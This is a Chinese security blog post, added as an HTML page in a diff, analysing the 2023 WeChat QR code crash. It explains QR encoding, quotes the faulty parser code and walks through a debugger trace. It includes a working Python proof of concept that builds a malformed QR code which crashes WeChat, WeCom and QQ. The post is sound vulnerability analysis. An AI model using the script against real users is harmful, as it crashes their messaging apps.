@@ -1,0 +1,828 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bg/apple-touch-icon.png">
+  <link rel="icon" href="/img/bg/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="张栩滔">
+  <meta name="keywords" content="洞源实验室,InsBug,网络安全,软件安全,安全测评,AI安全,SDLC,漏洞分析">
+  
+    <meta name="description" content="一、事件背景腾讯旗下的微信是一款社交通讯应用程序，由中国互联网巨头腾讯公司开发和运营。作为一款领先的社交应用，微信在全球范围内拥有大量的注册用户，且用户的活跃度极高。在微信中，用户可以通过扫描二维码来进行好友添加、进入公众号页面、加入群聊、进入小程序等。 2023年4月23日，用户在扫描或浏览某些畸形二维码时，会导致微信出现闪退等异常情况。 据了解，这种异常情况主要是由于畸形二维码造成的越界读取产">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WECHAT二维码闪退分析">
+<meta property="og:url" content="https://insbug.net/wechat-qr-code-crash-analysis/">
+<meta property="og:site_name" content="洞源实验室 | 网络安全实践与AI安全探索">
+<meta property="og:description" content="一、事件背景腾讯旗下的微信是一款社交通讯应用程序，由中国互联网巨头腾讯公司开发和运营。作为一款领先的社交应用，微信在全球范围内拥有大量的注册用户，且用户的活跃度极高。在微信中，用户可以通过扫描二维码来进行好友添加、进入公众号页面、加入群聊、进入小程序等。 2023年4月23日，用户在扫描或浏览某些畸形二维码时，会导致微信出现闪退等异常情况。 据了解，这种异常情况主要是由于畸形二维码造成的越界读取产">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398209230.5439280043970912.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398209960.6309489573381926.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398210730.6949859388724858.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398211450.43552941040540194.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398212270.07716057325324499.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398213010.6554953881725718.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398213730.6163563922883832.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398214450.5068536679140699.jpeg">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398215170.9858579488527592.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398215880.1155698747420828.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398216570.3079628567830115.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398217290.6608456347282743.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398218070.6184402078686272.png">
+<meta property="og:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398218860.17717672611680269.png">
+<meta property="article:published_time" content="2023-04-28T11:20:00.000Z">
+<meta property="article:modified_time" content="2025-10-30T12:30:04.133Z">
+<meta property="article:author" content="裴伟伟">
+<meta property="article:tag" content="微信">
+<meta property="article:tag" content="二维码">
+<meta property="article:tag" content="闪退">
+<meta property="article:tag" content="崩溃分析">
+<meta property="article:tag" content="移动应用">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://insbug.net/wechat-qr-code-crash-analysis/assets/17617398209230.5439280043970912.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>WECHAT二维码闪退分析 - 洞源实验室 | 网络安全实践与AI安全探索</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"insbug.net","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/bg/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"google":{"measurement_id":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="洞源实验室 | 网络安全实践与AI安全探索" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>洞源实验室 | 网络安全实践与AI安全探索</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="WECHAT二维码闪退分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        张栩滔
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-28 19:20" pubdate>
+          2023年4月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">WECHAT二维码闪退分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一、事件背景"><a href="#一、事件背景" class="headerlink" title="一、事件背景"></a>一、事件背景</h2><p>腾讯旗下的微信是一款社交通讯应用程序，由中国互联网巨头腾讯公司开发和运营。作为一款领先的社交应用，微信在全球范围内拥有大量的注册用户，且用户的活跃度极高。在微信中，用户可以通过扫描二维码来进行好友添加、进入公众号页面、加入群聊、进入小程序等。</p>
+<p>2023年4月23日，用户在扫描或浏览某些畸形二维码时，会导致微信出现闪退等异常情况。</p>
+<p>据了解，这种异常情况主要是由于畸形二维码造成的越界读取产生。</p>
+<h2 id="二、事件过程"><a href="#二、事件过程" class="headerlink" title="二、事件过程"></a>二、事件过程</h2><p><img src="/./wechat-qr-code-crash-analysis/assets/17617398209230.5439280043970912.png" srcset="/img/bg/loading.gif" lazyload></p>
+<p>2023年4月23日晚上，部分微信用户反馈点开二维码图片会造成闪退。</p>
+<p><img src="/./wechat-qr-code-crash-analysis/assets/17617398209960.6309489573381926.png" srcset="/img/bg/loading.gif" lazyload></p>
+<p>2023年4月24日凌晨三点，GZTime发出了制造畸形二维码的python代码。</p>
+<p><img src="/./wechat-qr-code-crash-analysis/assets/17617398210730.6949859388724858.png" srcset="/img/bg/loading.gif" lazyload></p>
+<p>2023年4月24日下午两点，Konano发现微信开源的二维码识别引擎中的问题代码。</p>
+<p><img src="/./wechat-qr-code-crash-analysis/assets/17617398211450.43552941040540194.png" srcset="/img/bg/loading.gif" lazyload></p>
+<p>至文章编写的2023年4月26日为止，iOS端微信尚未更新修复此bug。</p>
+<h2 id="三、技术分析"><a href="#三、技术分析" class="headerlink" title="三、技术分析"></a>三、技术分析</h2><h3 id="1、-二维码基础"><a href="#1、-二维码基础" class="headerlink" title="1、 二维码基础"></a>1、 二维码基础</h3><p>这里会介绍二维码创建的部分步骤，以用来分析后续的畸形二维码。</p>
+<h3 id="1-1-数据分析"><a href="#1-1-数据分析" class="headerlink" title="1.1 数据分析"></a>1.1 数据分析</h3><p>QR码将一串文本编码成二进制位（1和0）。QR标准有四种文本编码模式：数字、字母数字混合、字节和汉字。每种模式将文本转换为不同的二进制位字符串，但每种编码方法都使用不同的方法将数据编码为最短的二进制位字符串。</p>
+<h3 id="1-2-数据编码"><a href="#1-2-数据编码" class="headerlink" title="1.2 数据编码"></a>1.2 数据编码</h3><h3 id="1-2-1-纠错级别"><a href="#1-2-1-纠错级别" class="headerlink" title="1.2.1 纠错级别"></a>1.2.1 纠错级别</h3><p>二维码的四个纠错级别是：L、M、Q、H。</p>
+<p>L表示最低纠错级别，能够修复约7%的数据码字错误；</p>
+<p>M表示中等纠错级别，能够修复约15%的数据码字错误；</p>
+<p>Q表示较高纠错级别，能够修复约25%的数据码字错误；</p>
+<p>H表示最高纠错级别，能够修复约30%的数据码字错误。</p>
+<h3 id="1-2-2-版本"><a href="#1-2-2-版本" class="headerlink" title="1.2.2 版本"></a>1.2.2 版本</h3><p>二维码的版本指的是二维码矩阵中每一行和每一列的模块数，例如版本1的二维码矩阵大小是21x21（包括两个空白区域），版本2的大小是25x25，以此类推。版本越高，可以存储的信息也就越多。每个版本都有一个版本信息指示符来标识它的版本。（最多四十个版本）</p>
+<p><img src="/./wechat-qr-code-crash-analysis/assets/17617398212270.07716057325324499.png" srcset="/img/bg/loading.gif" lazyload></p>
+<h3 id="1-2-3-使用所选模式编码"><a href="#1-2-3-使用所选模式编码" class="headerlink" title="1.2.3 使用所选模式编码"></a>1.2.3 使用所选模式编码</h3><p>• Numeric Mode Encoding</p>
+<p>• Alphanumeric Mode Encoding</p>
+<p>• Byte Mode Encoding</p>
+<p>• Kanji Mode Encoding</p>
+<h3 id="1-2-4-添加模式指示器"><a href="#1-2-4-添加模式指示器" class="headerlink" title="1.2.4 添加模式指示器"></a>1.2.4 添加模式指示器</h3><p><img src="/./wechat-qr-code-crash-analysis/assets/17617398213010.6554953881725718.png" srcset="/img/bg/loading.gif" lazyload></p>
+<h3 id="1-2-5-添加字符计数指示器"><a href="#1-2-5-添加字符计数指示器" class="headerlink" title="1.2.5 添加字符计数指示器"></a>1.2.5 添加字符计数指示器</h3><p>后续字符有多少个，根据版本不同，这个指示器所占的位数不同。</p>
+<p><img src="/./wechat-qr-code-crash-analysis/assets/17617398213730.6163563922883832.png" srcset="/img/bg/loading.gif" lazyload></p>
+<h3 id="1-2-6-确定QR码需要的位数"><a href="#1-2-6-确定QR码需要的位数" class="headerlink" title="1.2.6 确定QR码需要的位数"></a>1.2.6 确定QR码需要的位数</h3><p><img src="/./wechat-qr-code-crash-analysis/assets/17617398214450.5068536679140699.jpeg" srcset="/img/bg/loading.gif" lazyload></p>
+<h3 id="1-2-7-添加终止符"><a href="#1-2-7-添加终止符" class="headerlink" title="1.2.7 添加终止符"></a>1.2.7 添加终止符</h3><p>添加1~4个0（bit）使得达到所要求的位数；添加了终止符后如果bit数不是8的倍数则继续添加0使得为8的倍数；如果最终的bit串仍然太短，则添加填充字符11101100 00010001。</p>
+<h3 id="2、-二维码基础"><a href="#2、-二维码基础" class="headerlink" title="2、 二维码基础"></a>2、 二维码基础</h3><p>这里会介绍二维码创建的部分步骤，以用来分析后续的畸形二维码。</p>
+<h3 id="2-1-代码"><a href="#2-1-代码" class="headerlink" title="2.1 代码"></a>2.1 代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> qrcode  <br><span class="hljs-keyword">from</span> qrcode.util <span class="hljs-keyword">import</span> \*  <br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hack</span>\_put(<span class="hljs-variable language_">self</span>, num, <span class="hljs-built_in">len</span>):  <br> <span class="hljs-keyword">if</span> num == <span class="hljs-number">0</span>:  <br>     num = <span class="hljs-number">2</span> <span class="hljs-comment"># faker length of hack\_data  </span><br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>):  <br>     <span class="hljs-variable language_">self</span>.put\_bit(((num &gt;&gt; (<span class="hljs-built_in">len</span> - i - <span class="hljs-number">1</span>)) &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">1</span>)  <br>qrcode.util.BitBuffer.put = hack\_put  <br>qr = qrcode.QRCode(<span class="hljs-number">2</span>, qrcode.constants.ERROR\_CORRECT\_Q, mask\_pattern=<span class="hljs-number">0</span>)  <br>data = <span class="hljs-string">&quot;tested by InsBug&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)  <br>data += <span class="hljs-string">b&#x27; &#x27;</span> \* (<span class="hljs-number">22</span>-<span class="hljs-built_in">len</span>(data)-<span class="hljs-number">3</span>)  <br>\<span class="hljs-comment"># 22为2-Q的Total Number of Data Codewords for this Version and EC Level，-3是由于模式和长度指示器共占了24位，正好为3Byte。  </span><br>user\_data=QRData(data, MODE\_8BIT\_BYTE)  <br>hack\_data=QRData(<span class="hljs-string">b&#x27;&#x27;</span>, MODE\_8BIT\_BYTE)  <br>qr.add\_data(user\_data)  <br>qr.add\_data(hack\_data)  <br>  <br>img = qr.make\_image()  <br>img.save(<span class="hljs-string">&quot;.png&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-2-生成结果及扫描结果"><a href="#2-2-生成结果及扫描结果" class="headerlink" title="2.2 生成结果及扫描结果"></a>2.2 生成结果及扫描结果</h3><p><img src="/./wechat-qr-code-crash-analysis/assets/17617398215170.9858579488527592.png" srcset="/img/bg/loading.gif" lazyload></p>
+<p>该二维码通过上述代码生成。</p>
+<p><img src="/./wechat-qr-code-crash-analysis/assets/17617398215880.1155698747420828.png" srcset="/img/bg/loading.gif" lazyload></p>
+<p>QRazyBox的解析结果，发现hack_data被解释成了一个Byte Mode指示器，并且长度为代码中设置的faker length，这时候如果再往后续读取数据便开始越界解析。</p>
+<h3 id="2-3-CRASH演示"><a href="#2-3-CRASH演示" class="headerlink" title="2.3 CRASH演示"></a>2.3 CRASH演示</h3><p><img src="/./wechat-qr-code-crash-analysis/assets/17617398216570.3079628567830115.png" srcset="/img/bg/loading.gif" lazyload></p>
+<p>大部分用户反馈的微信点开二维码图片闪退的问题，在企业微信41.03.6008版本中同样存在。</p>
+<h3 id="3、CRASH分析"><a href="#3、CRASH分析" class="headerlink" title="3、CRASH分析"></a>3、CRASH分析</h3><h3 id="3-1-源码分析"><a href="#3-1-源码分析" class="headerlink" title="3.1 源码分析"></a>3.1 源码分析</h3><p>由于根源问题是wechat_qrcode这个开源二维码识别引擎出现的问题。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C"> <span class="hljs-type">int</span> nBytes = count;  <br> BitSource&amp; <span class="hljs-title function_">bits</span><span class="hljs-params">(\*bits\_)</span>;  <br> <span class="hljs-comment">// Don&#x27;t crash trying to read more bits than we have available.  </span><br> <span class="hljs-type">int</span> available = bits.available();  <br> <span class="hljs-comment">// try to repair count data if count data is invalid  </span><br> <span class="hljs-keyword">if</span> (count \* <span class="hljs-number">8</span> &gt; available) &#123;  <br>     count = (available + <span class="hljs-number">7</span> / <span class="hljs-number">8</span>);  <br> &#125;  <br>  <br> ArrayRef&lt;<span class="hljs-type">char</span>&gt; bytes\_(count);  <br> <span class="hljs-type">char</span>\* readBytes = &amp;(\*bytes\_)\[<span class="hljs-number">0</span>\];<br></code></pre></td></tr></table></figure>
+
+<p>以上为导致出现问题的解析代码。</p>
+<p>（代码文件链接 <a target="_blank" rel="noopener" href="https://github.com/opencv/opencv/_contrib/blob/960b3f685f39c0602b8a0dd35973a82ee72b7e3c/modules/wechat/_qrcode/src/zxing/qrcode/decoder/decoded/_bit/_stream/_parser.cpp#L202-L203">https://github.com/opencv/opencv\_contrib/blob/960b3f685f39c0602b8a0dd35973a82ee72b7e3c/modules/wechat\_qrcode/src/zxing/qrcode/decoder/decoded\_bit\_stream\_parser.cpp#L202-L203</a> ）</p>
+<p>最终在填入一个有长度的空比特的时候，nByte不为0，available为0，执行到199行count被更新为0。</p>
+<p>在执行到203行的时候，由于count为0，声明的是一个空数组，后续对其访问则是非法访问。其也对应了最后出错的EXCEPTION_ACCESS_VIOLATION。由于这一份引擎在腾讯系软件中广泛使用，所以除了微信，在企业微信、QQ中也同样会因为该二维码造成闪退。</p>
+<h3 id="3-2-逆向分析"><a href="#3-2-逆向分析" class="headerlink" title="3.2 逆向分析"></a>3.2 逆向分析</h3><p><img src="/./wechat-qr-code-crash-analysis/assets/17617398217290.6608456347282743.png" srcset="/img/bg/loading.gif" lazyload></p>
+<p>在打开图片的时候，会出现KMEAS_MS_FACTOR和KMEANS_COUNT_FACTOR，查阅资源发现KMEANS是一个可应用于图像分割的算法。猜测其打开二维码的时候，二维码会被进行处理，随后识别数据读入内存中。</p>
+<p><img src="/./wechat-qr-code-crash-analysis/assets/17617398218070.6184402078686272.png" srcset="/img/bg/loading.gif" lazyload></p>
+<p>这里进行memcpy函数，其函数原型如下：</p>
+<p><em>&#x2F;*<br>*描述：此类函数是用于对字符串进行复制（拷贝），属于内存拷贝！<br>*<br>*参数：<br>*   [out] dst：拷贝完成之后的字符串<br>*   [in] src ：需要拷贝的字符串<br>*   [in] n   ：需要拷贝的字节数<br>*<br>*返回值：指向 dst 这个字符串的指针<br>*注意：如果需要拷贝的字节数n 大于 dst 的内存大小，程序会崩溃</em><br><em>*&#x2F;</em><br>void *memcpy(void *dst, void *src, unsigned int n);</p>
+<p>所以栈顶的由上往下的参数分别是：</p>
+<p>dst：0x300422BB</p>
+<p>src：0x00000000</p>
+<p>n：2</p>
+<p>然后会发现，在EIP所指处指令为mov al,byte ptr ds:[esi]，操作是从esi指向的内存单元读取一个字节，放入al寄存器中，而此时esi为0x00000000，所以就是从0x00000000处读取1个字节数据到之前已写入内存的“tested by InsBug   ”后。这里便会导致非法访问，产生crash。</p>
+<p><img src="/./wechat-qr-code-crash-analysis/assets/17617398218860.17717672611680269.png" srcset="/img/bg/loading.gif" lazyload></p>
+<h2 id="四、相关反应"><a href="#四、相关反应" class="headerlink" title="四、相关反应"></a>四、相关反应</h2><p>至文章编写的2023年4月26日为止，微信的官方微博与官方网站尚未对此bug进行回应。</p>
+<h2 id="五、事件启示"><a href="#五、事件启示" class="headerlink" title="五、事件启示"></a>五、事件启示</h2><p>通过此次闪退事件，我们能看出外部的输入是不可信的，正常生成的输入在程序处理时可能不会产生问题，能够对程序的正常运行产生影响的是精心构造的恶意输入或畸形输入。要避免这种情况的发生，除了建立完善的测试体系之外，代码提交前的代码审计工作也十分重要。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/" class="category-chain-item">事件分析</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%BE%AE%E4%BF%A1/" class="print-no-link">#微信</a>
+      
+        <a href="/tags/%E4%BA%8C%E7%BB%B4%E7%A0%81/" class="print-no-link">#二维码</a>
+      
+        <a href="/tags/%E9%97%AA%E9%80%80/" class="print-no-link">#闪退</a>
+      
+        <a href="/tags/%E5%B4%A9%E6%BA%83%E5%88%86%E6%9E%90/" class="print-no-link">#崩溃分析</a>
+      
+        <a href="/tags/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8/" class="print-no-link">#移动应用</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>WECHAT二维码闪退分析</div>
+      <div>https://insbug.net/wechat-qr-code-crash-analysis/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>张栩滔</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/3cx-desktop-app-supply-chain-attack-analysis/" title="3CX Desktop App供应链攻击分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">3CX Desktop App供应链攻击分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/sdlc-security-best-practices-security-release/" title="SDLC安全最佳实践：安全发布">
+                        <span class="hidden-mobile">SDLC安全最佳实践：安全发布</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"InsBug/Official-Website-CN","repo-id":"R_kgDOQLQ7Mg","category":"Announcements","category-id":"DIC_kwDOQLQ7Ms4CxNHi","theme-light":"light_protanopia","theme-dark":"dark_protanopia","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light_protanopia';
+        var dark = 'dark_protanopia';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
